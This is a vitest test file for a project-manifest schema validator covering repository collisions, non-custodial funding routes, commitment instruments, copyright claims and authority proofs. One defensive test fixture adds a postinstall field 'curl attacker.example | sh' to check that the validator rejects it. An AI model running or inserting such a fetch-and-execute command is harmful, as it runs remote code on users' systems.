/** Tests pull-request project manifests and registry-wide collision rejection. */

import { describe, expect, it } from "vitest";
import asi from "../../projects/asi/project.json";
import deltaStar from "../../projects/delta-star/project.json";
import eliza from "../../projects/eliza/project.json";
import heirElements from "../../projects/heir-elements-sdk/project.json";
import {
  assertHistoricalProjectDefinition,
  assertProjectDefinition,
  assertProjectRegistry,
} from "./project-schema.mjs";

interface MutablePolicyFixture {
  authority: unknown;
  steward: { kind: string };
  terms: {
    assignment: unknown;
    copyright: { claimedLegalHolder: string | null; model: string };
    externalPrize: { rulesSha256: string | null };
  };
}

function mutablePolicyFixture(value: unknown): MutablePolicyFixture {
  return structuredClone(value) as MutablePolicyFixture;
}

interface MutableActivationFixture {
  status: string;
  authority: unknown;
  terms: {
    revision: string;
    receiptPolicy: unknown;
    inbound: unknown;
    copyright: {
      model: string;
      claimedLegalHolder: string | null;
      legalCapacity: unknown;
      governanceResolution: unknown;
    };
    repositoryLicense: { fileSha256: string | null };
  };
}

function activatedWithoutOwnershipClaim(model: string): unknown {
  const fixture = structuredClone(eliza) as unknown as MutableActivationFixture;
  const verifiedAt = "2026-08-16T00:00:00.000Z";
  const proofCommit = "a".repeat(40);
  const inboundCommit = "c".repeat(40);
  fixture.status = "active";
  fixture.authority = {
    state: "verified",
    reason: null,
    role: "project-steward",
    repositoryId: eliza.authority.repositoryId,
    repositoryNodeId: eliza.authority.repositoryNodeId,
    proof: {
      url: `https://github.com/elizaOS/eliza/blob/${proofCommit}/.github/slop-project.json`,
      commitSha: proofCommit,
      fileSha256: "b".repeat(64),
      policyRevision: fixture.terms.revision,
      verifiedAt,
    },
  };
  fixture.terms.inbound = {
    mode: "license",
    termsUrl: `https://github.com/elizaOS/eliza/blob/${inboundCommit}/LICENSE`,
    commitSha: inboundCommit,
    fileSha256: "d".repeat(64),
    version: "1",
    acceptance: "Inbound equals outbound under the repository license",
  };
  fixture.terms.receiptPolicy = {
    state: "active",
    activatedAt: verifiedAt,
    bindings: [
      {
        activatedAt: verifiedAt,
        policyRevision: fixture.terms.revision,
        licenseSha256: fixture.terms.repositoryLicense.fileSha256,
        inboundTermsSha256: "d".repeat(64),
        prizeRulesSha256: null,
      },
    ],
  };
  fixture.terms.copyright = {
    ...fixture.terms.copyright,
    model,
    claimedLegalHolder: null,
    legalCapacity: null,
    governanceResolution: null,
  };
  return fixture;
}

describe("project proposal schema", () => {
  it("accepts complete self-contained definitions from the manifest inventory", () => {
    expect(assertProjectRegistry([eliza, deltaStar])).toHaveLength(2);
    expect(assertProjectRegistry([eliza])).toHaveLength(1);
    expect(assertProjectDefinition(eliza).reviewSkill.id).toBe(
      "review-eliza-contributions",
    );
  });

  it("rejects executable extras, identity mismatch, and fake commitment", () => {
    const executable = structuredClone(eliza) as Record<string, unknown>;
    executable.postinstall = "curl attacker.example | sh";
    expect(() => assertProjectDefinition(executable)).toThrow(/unexpected/u);

    const mismatched = structuredClone(eliza);
    mismatched.repositories[0].githubUrl = "https://github.com/attacker/repo";
    expect(() => assertProjectDefinition(mismatched)).toThrow(
      /does not match/u,
    );

    const fakeCommitment = structuredClone(eliza);
    fakeCommitment.reward.committedMinor = "1000000";
    expect(() => assertProjectDefinition(fakeCommitment)).toThrow(
      /inconsistent/u,
    );

    const fakeEnable = structuredClone(eliza);
    fakeEnable.reward.paymentMode = "enabled";
    expect(() => assertProjectDefinition(fakeEnable)).toThrow(/inconsistent/u);

    const misleadingCap = structuredClone(eliza);
    misleadingCap.reward.monthlyCapDisplay = "$100,000,000";
    expect(() => assertProjectDefinition(misleadingCap)).toThrow(
      /inconsistent/u,
    );

    const overlargeCap = structuredClone(eliza);
    overlargeCap.reward.monthlyCapMinor = "1000000000000001";
    expect(() => assertProjectDefinition(overlargeCap)).toThrow(/at most/u);
  });

  it("rejects repository and skill collisions across project folders", () => {
    const copy = structuredClone(deltaStar);
    copy.status = "paused";
    copy.repositories[0] = structuredClone(eliza.repositories[0]);
    (copy as unknown as { authority: unknown }).authority = {
      ...structuredClone(eliza.authority),
      state: "unverified",
      reason: "missing-repository-proof",
      proof: null,
    };
    copy.terms.repositoryLicense = structuredClone(
      eliza.terms.repositoryLicense,
    );
    copy.terms.inbound = structuredClone(eliza.terms.inbound);
    (copy.terms as unknown as { receiptPolicy: unknown }).receiptPolicy = {
      state: "pending-authority-activation",
      activatedAt: null,
      bindings: [],
    };
    expect(() => assertProjectRegistry([eliza, copy])).toThrow(
      /duplicate repositories/u,
    );
  });

  it("requires exactly one manifest-selected root publication", () => {
    const none = [structuredClone(eliza), structuredClone(deltaStar)];
    none[0].skill.publishAtRoot = false;
    expect(() => assertProjectRegistry(none)).toThrow(
      /exactly one root-published/u,
    );

    const multiple = [structuredClone(eliza), structuredClone(deltaStar)];
    multiple[1].skill.publishAtRoot = true;
    expect(() => assertProjectRegistry(multiple)).toThrow(
      /exactly one root-published/u,
    );
  });

  it("requires disclosure without restricting the declared model", () => {
    expect(assertProjectDefinition(eliza).modelPolicy).toEqual({
      mode: "open-declared",
      disclosureRequired: true,
    });
    const gated = structuredClone(eliza);
    gated.modelPolicy = {
      mode: "frontier-only",
      approved: [{ client: "codex", provider: "openai", model: "example" }],
    } as never;
    expect(() => assertProjectDefinition(gated)).toThrow(
      /unexpected|declared model/u,
    );
  });

  it("keeps direct funding non-custodial and rejects ambiguous routes", () => {
    expect(assertProjectDefinition(eliza).funding).toMatchObject({
      mode: "direct-noncustodial",
      addresses: [],
    });
    const alteredDisclosure = structuredClone(eliza);
    alteredDisclosure.funding.disclosure = "Slop holds the funds." as never;
    expect(() => assertProjectDefinition(alteredDisclosure)).toThrow(
      /non-custodial/u,
    );

    const rotation = structuredClone(eliza);
    rotation.funding.addresses = [
      {
        network: "solana",
        asset: "USDC",
        address: "11111111111111111111111111111111",
        effectiveAt: "2026-08-16T00:00:00.000Z",
        replacedAt: "2026-08-17T00:00:00.000Z",
      },
      {
        network: "solana",
        asset: "USDC",
        address: "Vote111111111111111111111111111111111111111",
        effectiveAt: "2026-08-17T00:00:00.000Z",
        replacedAt: null,
      },
    ] as never;
    expect(assertProjectDefinition(rotation).funding.addresses).toHaveLength(2);
    const overlap = structuredClone(rotation);
    (
      overlap.funding.addresses[0] as unknown as {
        replacedAt: string | null;
      }
    ).replacedAt = "2026-08-18T00:00:00.000Z";
    expect(() => assertProjectDefinition(overlap)).toThrow(
      /overlapping active routes/u,
    );

    const invalidSolana = structuredClone(eliza);
    invalidSolana.funding.addresses = [
      {
        network: "solana",
        asset: "USDC",
        address: "2".repeat(32),
        effectiveAt: "2026-08-16T00:00:00.000Z",
        replacedAt: null,
      },
    ] as never;
    expect(() => assertProjectDefinition(invalidSolana)).toThrow(
      /address is invalid/u,
    );
  });

  it("labels a pool committed only behind an active reviewed instrument", () => {
    const instrument = {
      kind: "squads-v4-vault",
      network: "solana",
      asset: "USDC",
      multisig: "11111111111111111111111111111111",
      vault: "Vote111111111111111111111111111111111111111",
      vaultIndex: 0,
      funderMember: "Stake11111111111111111111111111111111111111",
      stewardMember: "SysvarRent111111111111111111111111111111111",
      funderActorId: "18633264",
      deadline: "2026-12-01T00:00:00.000Z",
      effectiveAt: "2026-08-01T00:00:00.000Z",
      replacedAt: null,
    };
    const committed = structuredClone(eliza) as Record<string, unknown> & {
      reward: Record<string, unknown>;
      funding: Record<string, unknown>;
    };
    committed.reward.paymentMode = "enabled";
    committed.reward.fundingState = "committed";
    committed.reward.committedMinor = "5000000";
    committed.funding.commitments = [instrument];
    expect(assertProjectDefinition(committed).reward.fundingState).toBe(
      "committed",
    );

    const missingInstrument = structuredClone(committed);
    delete missingInstrument.funding.commitments;
    expect(() => assertProjectDefinition(missingInstrument)).toThrow(
      /active commitment instrument/u,
    );

    const replacedOnly = structuredClone(committed);
    replacedOnly.funding.commitments = [
      { ...instrument, replacedAt: "2026-09-01T00:00:00.000Z" },
    ];
    expect(() => assertProjectDefinition(replacedOnly)).toThrow(
      /active commitment instrument/u,
    );

    const custodialKind = structuredClone(committed);
    custodialKind.funding.commitments = [
      { ...instrument, kind: "slop-custody" },
    ];
    expect(() => assertProjectDefinition(custodialKind)).toThrow(
      /kind is unsupported/u,
    );

    const wrongStream = structuredClone(committed);
    wrongStream.funding.commitments = [
      {
        kind: "sablier-lockup-v4",
        network: "base",
        asset: "USDC",
        contract: `0x${"9".repeat(40)}`,
        streamId: "7",
        deadline: "2026-12-01T00:00:00.000Z",
        effectiveAt: "2026-08-01T00:00:00.000Z",
        replacedAt: null,
      },
    ];
    expect(() => assertProjectDefinition(wrongStream)).toThrow(
      /reviewed Sablier Lockup v4 deployment/u,
    );
  });

  it("discloses unverified authority without blocking contribution", () => {
    const activeWithoutProof = structuredClone(eliza);
    activeWithoutProof.status = "active";
    const unprovenAuthority = activeWithoutProof.authority as Record<
      string,
      unknown
    >;
    unprovenAuthority.state = "unverified";
    unprovenAuthority.reason = "missing-repository-proof";
    unprovenAuthority.proof = null;
    expect(assertProjectDefinition(activeWithoutProof).status).toBe("active");

    const loginAsIdentity = structuredClone(eliza);
    loginAsIdentity.steward.github.actorId = "elizaOS";
    expect(() => assertProjectDefinition(loginAsIdentity)).toThrow(/actorId/u);

    const mutableLicense = structuredClone(eliza);
    mutableLicense.terms.repositoryLicense.url =
      "https://github.com/elizaOS/eliza/blob/develop/LICENSE";
    expect(() => assertProjectDefinition(mutableLicense)).toThrow(/immutable/u);

    const mismatchedInbound = structuredClone(eliza) as unknown as {
      terms: {
        inbound: {
          mode: string;
          termsUrl: string | null;
          commitSha: string | null;
          fileSha256: string | null;
          version: string | null;
          acceptance: string | null;
        };
      };
    };
    mismatchedInbound.terms.inbound = {
      mode: "cla",
      termsUrl: `https://github.com/elizaOS/eliza/blob/${"b".repeat(40)}/CLA.md`,
      commitSha: "a".repeat(40),
      fileSha256: "c".repeat(64),
      version: "1",
      acceptance: "Signed before contribution",
    };
    expect(() => assertProjectDefinition(mismatchedInbound)).toThrow(
      /bind its repository, commit/u,
    );

    const fakeProof = mutablePolicyFixture(eliza);
    fakeProof.authority = {
      state: "verified",
      reason: null,
      role: "project-steward",
      repositoryId: eliza.authority.repositoryId,
      repositoryNodeId: eliza.authority.repositoryNodeId,
      proof: {
        url: "https://github.com/elizaOS/eliza/blob/develop/.github/slop-project.json",
        commitSha: "a".repeat(40),
        fileSha256: "b".repeat(64),
        policyRevision: eliza.terms.revision,
        verifiedAt: "2026-08-16T00:00:00.000Z",
      },
    };
    expect(() => assertProjectDefinition(fakeProof)).toThrow(/immutable/u);
  });

  it("requires signed legal evidence for sponsor and DAO title claims", () => {
    const sponsor = mutablePolicyFixture(eliza);
    sponsor.terms.copyright.model = "sponsor-owned";
    sponsor.terms.copyright.claimedLegalHolder = "Example Research, Inc.";
    expect(() => assertProjectDefinition(sponsor)).toThrow(
      /signed assignment/u,
    );

    const contributorRetained = mutablePolicyFixture(eliza);
    contributorRetained.terms.copyright.model = "contributor-retained";
    contributorRetained.terms.copyright.claimedLegalHolder = "Sponsor, Inc.";
    expect(() => assertProjectDefinition(contributorRetained)).toThrow(
      /forbid/u,
    );

    const dao = mutablePolicyFixture(eliza);
    dao.steward.kind = "dao";
    dao.terms.copyright.model = "sponsor-owned";
    dao.terms.copyright.claimedLegalHolder = "Example DAO";
    dao.terms.assignment = {
      assignee: "Example DAO",
      instrumentUrl: "https://example.com/assignment.pdf",
      version: "1",
      fileSha256: "a".repeat(64),
      signedAt: "2026-08-16T00:00:00.000Z",
    };
    expect(() => assertProjectDefinition(dao)).toThrow(/legal capacity/u);
  });

  it("treats null-claim unknown and mixed copyright as terminal and activation-ready", () => {
    for (const manifest of [asi, deltaStar, eliza, heirElements]) {
      const project = assertProjectDefinition(manifest);
      expect(["unknown", "mixed"]).toContain(project.terms.copyright.model);
      expect(project.terms.copyright.claimedLegalHolder).toBeNull();
      expect(project.terms.copyright.legalCapacity).toBeNull();
      expect(project.terms.copyright.governanceResolution).toBeNull();
    }
    for (const model of ["unknown", "mixed"]) {
      const active = assertProjectDefinition(
        activatedWithoutOwnershipClaim(model),
      );
      expect(active.status).toBe("active");
      expect(active.terms.copyright.claimedLegalHolder).toBeNull();
    }
  });

  it("rejects an ownership claim outside signed sponsor-owned terms", () => {
    for (const model of ["unknown", "mixed"]) {
      const claimed = mutablePolicyFixture(eliza);
      claimed.terms.copyright.model = model;
      claimed.terms.copyright.claimedLegalHolder = "Example Research, Inc.";
      expect(() => assertProjectDefinition(claimed)).toThrow(
        /no ownership claim/u,
      );
    }
  });

  it("permits a legacy unsupported holder only on the historical transition side", () => {
    const legacy = mutablePolicyFixture(eliza);
    legacy.terms.copyright.model = "mixed";
    legacy.terms.copyright.claimedLegalHolder = "Unsupported Legacy Holder";

    expect(() => assertProjectDefinition(legacy)).toThrow(
      /no ownership claim/u,
    );
    expect(
      assertHistoricalProjectDefinition(legacy).terms.copyright
        .claimedLegalHolder,
    ).toBe("Unsupported Legacy Holder");
  });

  it("keeps external prize rules outside platform settlement", () => {
    expect(deltaStar.reward.paymentMode).toBe("disabled");
    expect(deltaStar.terms.externalPrize?.allocationAuthority).toMatch(
      /author-approved/u,
    );
    expect(deltaStar.terms.externalPrize?.defaultContributorAllocation).toMatch(
      /^Equal shares for all named authors by default/u,
    );
    expect(deltaStar.terms.externalPrize?.defaultContributorAllocation).toMatch(
      /approval from every named author/u,
    );
    const inventedCapture = mutablePolicyFixture(deltaStar);
    inventedCapture.terms.externalPrize.rulesSha256 = "a".repeat(64);
    (
      inventedCapture.terms.externalPrize as { rulesCapturedAt?: string | null }
    ).rulesCapturedAt = null;
    (inventedCapture.terms.externalPrize as { version?: string }).version =
      "unknown";
    (inventedCapture as unknown as { status: string }).status = "paused";
    (
      inventedCapture as unknown as { terms: { receiptPolicy: unknown } }
    ).terms.receiptPolicy = {
      state: "pending-authority-activation",
      activatedAt: null,
      bindings: [],
    };
    expect(() => assertProjectDefinition(inventedCapture)).toThrow(
      /unverified rules/u,
    );
  });

  it("represents a missing repository license as unknown without pausing", () => {
    expect(assertProjectDefinition(heirElements).status).toBe("active");
    expect(heirElements.terms.repositoryLicense).toEqual({
      state: "unknown",
      spdx: null,
      url: null,
      commitSha: null,
      fileSha256: null,
    });
    expect(assertProjectDefinition(heirElements).authority.state).toBe(
      "unverified",
    );
  });
});
